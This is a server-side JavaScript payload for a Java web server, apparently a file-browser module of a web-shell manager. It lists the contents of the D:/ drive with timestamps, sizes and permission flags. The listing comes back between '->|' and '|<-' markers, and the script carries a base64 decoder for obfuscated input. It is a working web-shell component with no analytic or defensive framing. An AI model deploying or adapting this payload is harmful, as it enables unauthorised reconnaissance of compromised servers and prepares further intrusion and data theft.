try {
  load("nashorn:mozilla_compat.js");
} catch (e) {}
importPackage(Packages.java.util);
importPackage(Packages.java.lang);
importPackage(Packages.java.io);
var output = new StringBuffer("");
var cs = "UTF-8";
var tag_s = "->|";
var tag_e = "|<-";
try {
  response.setContentType("text/html");
  request.setCharacterEncoding(cs);
  response.setCharacterEncoding(cs);

  function asoutput(str) {
    return str;
  }
  function decode(str)  {
      try {
          prefixlen = Integer.parseInt(randomPrefix);
          str = str.substring(prefixlen);
      } catch (e) {
          prefixlen = 0;
      }
      if (encoder.equals("base64")) {
          return new String(this.Base64DecodeToByte(str), this.cs);
      }
      return str;
  }
  function Base64DecodeToByte(str) {
      var bt = null;
      var version = System.getProperty("java.version");
      try {
          if (version.compareTo("1.9") >= 0) {
              var clazz = Class.forName("java.util.Base64");
              var decoder = clazz.getMethod("getDecoder").invoke(null);
              bt =  decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
          } else {
              var clazz = Class.forName("sun.misc.BASE64Decoder");
              bt = clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
          }
          return bt;
      } catch (e) {
          return null;
      }
  }
  
  function FileTreeCode(dirPath) {
    var oF = new File(dirPath);
    var l = oF.listFiles();
    var s = "",
      sT,
      sQ,
      sF = "";
    var dt;
    var fm = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    for (var i = 0; i < l.length; i++) {
      dt = new java.util.Date(l[i].lastModified());
      sT = fm.format(dt);
      sQ = l[i].canRead() ? "R" : "-";
      sQ += l[i].canWrite() ? "W" : "-";
      try {
        sQ += l[i].getClass().getMethod("canExecute").invoke(l[i]) ? "X" : "-";
      } catch (e) {
        sQ += "-";
      }
      var nm = l[i].getName();
      if (l[i].isDirectory()) {
        s += nm + "/	" + sT + "	" + l[i].length() + "	" + sQ + "  ";
      } else {
        sF += nm + "	" + sT + "	" + l[i].length() + "	" + sQ + "";
      }
    }
    s += sF;
    return s;
  }
  output.append(FileTreeCode("D:/"));


  
} catch (e) {
  output.append("ERROR:// " + e.toString());
}
response.getWriter().print(tag_s + asoutput(output.toString()) + tag_e);
